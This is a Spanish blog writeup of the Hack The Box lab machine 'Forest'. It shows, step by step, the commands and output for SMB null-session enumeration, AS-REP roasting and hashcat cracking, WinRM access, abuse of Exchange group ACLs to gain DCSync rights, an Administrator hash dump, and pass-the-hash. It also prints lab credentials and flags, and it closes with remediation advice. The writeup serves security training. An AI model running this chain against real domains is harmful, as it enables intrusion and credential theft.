---
title: "HTB Forest — de sesión nula a Domain Admin"
date: 2026-07-18 10:00:00 -0400
categories: [Writeups, Active Directory]
tags: [htb, active-directory, kerberos, asreproast, dcsync, bloodhound, oscp]
image:
  path: /assets/img/posts/forest.png
  alt: "HTB Forest — Active Directory, Easy"
---

## Resumen

**Forest** es una máquina Windows Server 2016 (Domain Controller) de Hack The Box, dificultad **Easy**. El compromiso total del dominio `htb.local` se logra encadenando:

1. Enumeración anónima de usuarios por **sesión nula SMB**.
2. **AS-REP Roasting** sobre una cuenta de servicio sin preautenticación Kerberos.
3. Acceso por **WinRM** con las credenciales crackeadas.
4. Abuso de pertenencia a **Account Operators** para escalar hasta **DCSync**.
5. **Pass-the-Hash** como Administrator del dominio.

| Campo | Valor |
|---|---|
| IP | `10.129.1.114` |
| SO | Windows Server 2016 Standard |
| Dominio | `htb.local` |
| Dificultad | Easy |

## Reconocimiento

Un TTL de 127 en el ping ya delata Windows. El escaneo completo de puertos muestra la huella inequívoca de un Domain Controller: Kerberos, LDAP, DNS, SMB y ADWS conviviendo en la misma máquina.

```bash
nmap -p- --min-rate 2000 -T4 10.129.1.114

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139,445   open  smb
389,636   open  ldap / ldaps
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman        # WinRM
9389/tcp  open  adws
```

```bash
nmap -sCV -p 53,88,139,389,445,636,3268,5985,9389 10.129.1.114

Computer name: FOREST
Domain name:   htb.local
OS:            Windows Server 2016 Standard 14393
FQDN:          FOREST.htb.local
```

> La firma **Kerberos (88) + LDAP (389) + DNS (53) + SMB (445)** = Domain Controller. Apunta el hostname y el dominio a `/etc/hosts`: muchos ataques de AD necesitan resolver el nombre, no solo la IP.
{: .prompt-tip }

## Enumeración · Sesión nula SMB

El DC permite autenticación **anónima** contra SAMR. Sin credenciales se pueden listar los 31 usuarios del dominio, incluida la cuenta de servicio que abre la primera puerta.

```bash
nxc smb 10.129.1.114 -u '' -p '' --users

Administrator     krbtgt        sebastien
lucinda           svc-alfresco  andy
mark              santi         ...
[*] Enumerated 31 local users: HTB
```

> Guarda esta lista de usuarios: es la base de tres ataques — **AS-REP Roasting**, **password spraying** y detectar cuentas de servicio (prefijo `svc-`) con contraseñas débiles. Prueba también `--shares`, `--pass-pol` y `--rid-brute`.
{: .prompt-tip }

## AS-REP Roasting

La cuenta `svc-alfresco` tiene el flag `DONT_REQUIRE_PREAUTH`. El KDC entrega un AS-REP cifrado con la clave de su contraseña sin exigir preautenticación, así que se crackea offline.

```bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -format hashcat

$krb5asrep$23$svc-alfresco@HTB.LOCAL:1fde53f5...c130f
```

```bash
hashcat -m 18200 asrep.hash rockyou.txt -O

$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
```

**Credenciales obtenidas:** `svc-alfresco : s3rvice`

> Modos de hashcat para memorizar: `18200` AS-REP · `13100` Kerberoast (TGS) · `1000` NTLM · `5600` NetNTLMv2 · `5500` NetNTLMv1.
{: .prompt-tip }

## Foothold · User flag

El usuario pertenece a **Remote Management Users**, lo que habilita WinRM (5985).

```bash
evil-winrm -i 10.129.1.114 -u svc-alfresco -p 's3rvice'

PS> type C:\Users\svc-alfresco\Desktop\user.txt
```

> Cada vez que consigas credenciales válidas en un dominio, comprueba el puerto 5985 con `nxc winrm ...`. Si ves `(Pwn3d!)`, tienes shell. `evil-winrm` también acepta `-H <hash>` para Pass-the-Hash.
{: .prompt-tip }

**User flag:** `3b7ca76909db11964b6bc0ed51349a18`

## Escalada · Abuso de ACLs (BloodHound)

BloodHound revela la ruta de oro: `svc-alfresco` llega, por grupos anidados, hasta **Account Operators**, que puede editar grupos no protegidos por `AdminSDHolder`. Uno de ellos, **Exchange Windows Permissions**, posee **WriteDacl** sobre todo el dominio.

```
svc-alfresco
  └─▶ Service Accounts
        └─▶ Privileged IT Accounts
              ├─▶ Account Operators        # ruta de escalada
              └─▶ Remote Management Users  # por esto funcionó WinRM
```

| Principal (origen) | Permiso | Objetivo |
|---|---|---|
| Account Operators (`S-1-5-32-548`) | `GenericAll` | grupo Exchange Windows Permissions |
| Exchange Windows Permissions (`...-1121`) | `WriteDacl` | dominio `HTB.LOCAL` |

**5.1 — Crear un usuario controlado y meterlo en el grupo de Exchange:**

```powershell
net user pwn3d Passw0rd123! /add /domain
net group "Exchange Windows Permissions" pwn3d /add
net localgroup "Remote Management Users" pwn3d /add
```

**5.2 — Con WriteDACL, concederse derechos de replicación (DCSync):**

```bash
impacket-dacledit -action write -rights DCSync \
    -principal pwn3d -target-dn 'DC=htb,DC=local' \
    'htb.local/pwn3d:Passw0rd123!'

[*] DACL backed up to dacledit-...bak
[*] DACL modified successfully!
```

> `dacledit` guarda un backup automático del DACL original (`.bak`) — imprescindible para restaurar el estado en la fase de limpieza.
{: .prompt-warning }

## DCSync

Con derechos de replicación, nos hacemos pasar por un Domain Controller (MS-DRSR) y volcamos el hash NTLM del Administrator directamente del NTDS.

```bash
impacket-secretsdump 'htb.local/pwn3d:Passw0rd123!@10.129.1.114' \
    -just-dc-user Administrator

Administrator:500:aad3b...:32693b11e6aa90eb43d32c72a07ceea6:::
```

> DCSync no toca disco en el objetivo, así que suele evadir el antivirus. Si en vez del Administrator se replica `krbtgt`, se puede forjar un Golden Ticket y persistir en todo el dominio.
{: .prompt-danger }

## Root · Pass-the-Hash

No hace falta la contraseña en claro: autenticamos con el hash NTLM directamente.

```bash
nxc winrm 10.129.1.114 -u Administrator \
    -H 32693b11e6aa90eb43d32c72a07ceea6 \
    -x 'type C:\Users\Administrator\Desktop\root.txt'

[+] htb.local\Administrator (Pwn3d!)
```

**Root flag:** `5b0260e60ee1036d6385c75f29c4c63e`

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| Sesión nula SMB | Media | Restringir acceso anónimo (`RestrictAnonymous`, `RestrictAnonymousSAM`) |
| Kerberos pre-auth off (AS-REP Roasting) | Alta | Habilitar preautenticación; usar gMSA para cuentas de servicio |
| Contraseña débil (`s3rvice`) | Alta | Política de contraseñas robusta / gMSA con rotación automática |
| ACLs de Exchange (WriteDACL → DCSync) | Crítica | Split-permissions de Exchange; reducir membresía de Account Operators y Exchange Windows Permissions |
| Reutilización de NTLM (Pass-the-Hash) | Media | Deshabilitar NTLM; Protected Users; LAPS |

**Herramientas:** `nmap` · `netexec` · `impacket-GetNPUsers` · `hashcat` · `evil-winrm` · `bloodhound-python` · `impacket-dacledit` · `impacket-secretsdump`
